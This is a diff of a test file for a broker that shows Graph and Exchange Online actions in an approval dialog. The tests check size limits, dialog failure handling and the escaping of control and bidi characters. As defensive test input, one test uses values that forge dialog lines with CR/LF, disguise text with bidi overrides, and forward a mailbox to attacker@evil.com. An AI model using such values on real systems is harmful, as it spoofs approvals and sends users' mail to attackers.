@@ -90,13 +90,35 @@ describe('Broker graphRequest', () => {
     expect(t.order).toEqual(['vault', 'token', 'confirm', 'fetch']);
   });
 
-  it('caps the body shown in the dialog at 1500 characters with a visible notice', async () => {
+  it('refuses a write too long to show in full before vault, sign-in or dialog', async () => {
     const t = setup({ confirm: true });
-    const body = { note: 'n'.repeat(5000) };
-    await t.broker.graphRequest('acme', 'POST', '/users', body);
+    const out = parse(await t.broker.graphRequest('acme', 'POST', '/users', { note: 'n'.repeat(2000) }));
+    expect(out).toEqual({
+      error: 'too_long_to_approve',
+      message: 'This change is too large to show in the approval box. Split it into smaller requests.',
+    });
+    expect(t.vault.getCredential).not.toHaveBeenCalled();
+    expect(t.tokens.getAccessToken).not.toHaveBeenCalled();
+    expect(t.confirm).not.toHaveBeenCalled();
+    expect(t.fetch).not.toHaveBeenCalled();
+  });
+
+  it('shows an action of exactly the limit in full', async () => {
+    const t = setup({ confirm: true });
+    const head = 'Graph POST /users\n{\n  "note": ""\n}';
+    const note = 'n'.repeat(1500 - head.length);
+    await t.broker.graphRequest('acme', 'POST', '/users', { note });
     const action = t.confirm.mock.calls[0][0].action;
-    const full = JSON.stringify(body, null, 2);
-    expect(action).toBe(`Graph POST /users\n${full.slice(0, 1500)}\n… (${full.length - 1500} more characters not shown)`);
+    expect(action.length).toBe(1500);
+    expect(action).toContain(note);
+  });
+
+  it('escapes control and bidi characters in the Graph path and body', async () => {
+    const t = setup({ confirm: false });
+    await t.broker.graphRequest('acme', 'PATCH', '/users/x', { displayName: 'a\u202Eb\u200Bc\u2028d\r\ne' });
+    const action = t.confirm.mock.calls[0][0].action;
+    expect(action).toBe('Graph PATCH /users/x\n{\n  "displayName": "a\\u202Eb\\u200Bc\\u2028d\\r\\ne"\n}');
+    expect(action).not.toMatch(/[\u202E\u200B\u2028\r]/);
   });
 
   it('redacts the password in the action shown in the dialog', async () => {
@@ -177,6 +199,47 @@ describe('Broker exoCmdlet', () => {
     expect(t.confirm.mock.calls[0][0].action).toBe(
       "Set-Mailbox -Identity 'Jo O''Neil' -HiddenFromAddressListsEnabled:$true -Quota 5 -X $null",
     );
+  });
+
+  it('escapes CR/LF, tabs and bidi characters in parameter values so they cannot fake lines', async () => {
+    const t = setup({ confirm: false });
+    await t.broker.exoCmdlet('acme', 'Set-Mailbox', {
+      Identity: 'x\r\n\r\nAction:\r\nGet-Mailbox',
+      CustomAttribute1: 'evil\u202Emoc.\u2066x\u2069\tz\u0000',
+      ForwardingSmtpAddress: 'attacker@evil.com',
+    });
+    const action = t.confirm.mock.calls[0][0].action;
+    expect(action).toBe(
+      "Set-Mailbox -Identity 'x\\r\\n\\r\\nAction:\\r\\nGet-Mailbox' " +
+        "-CustomAttribute1 'evil\\u202Emoc.\\u2066x\\u2069\\tz\\u0000' -ForwardingSmtpAddress attacker@evil.com",
+    );
+    expect(action).not.toMatch(/[\r\n\t\u0000\u202E\u2066\u2069]/);
+  });
+
+  it('escapes bidi characters inside array and object values', async () => {
+    const t = setup({ confirm: false });
+    await t.broker.exoCmdlet('acme', 'Set-Mailbox', { Identity: 'x', EmailAddresses: ['a\u202Eb', 'c\nd'] });
+    expect(t.confirm.mock.calls[0][0].action).toBe('Set-Mailbox -Identity x -EmailAddresses ["a\\u202Eb","c\\nd"]');
+  });
+
+  it('refuses a cmdlet whose action is too long, before the vault', async () => {
+    const t = setup({ confirm: true });
+    const out = parse(await t.broker.exoCmdlet('acme', 'Set-Mailbox', { Identity: 'x', Notes: 'n'.repeat(1500) }));
+    expect(out.error).toBe('too_long_to_approve');
+    expect(t.vault.getCredential).not.toHaveBeenCalled();
+    expect(t.confirm).not.toHaveBeenCalled();
+    expect(t.exo).not.toHaveBeenCalled();
+  });
+
+  it('a dialog failure becomes dialog_failed (not denied) and nothing runs', async () => {
+    const t = setup();
+    t.confirm.mockImplementationOnce(async () => {
+      throw new BrokerError('dialog_failed', 'The Windows dialog could not be shown or timed out.');
+    });
+    const out = parse(await t.broker.exoCmdlet('acme', 'Set-Mailbox', { Identity: 'x' }));
+    expect(out).toEqual({ error: 'dialog_failed', message: 'The Windows dialog could not be shown or timed out.' });
+    expect(t.exo).not.toHaveBeenCalled();
+    expect(t.events.map((e) => e.type)).toEqual(['error']);
   });
 
   it('Set-Mailbox denied: no exo run, denied', async () => {
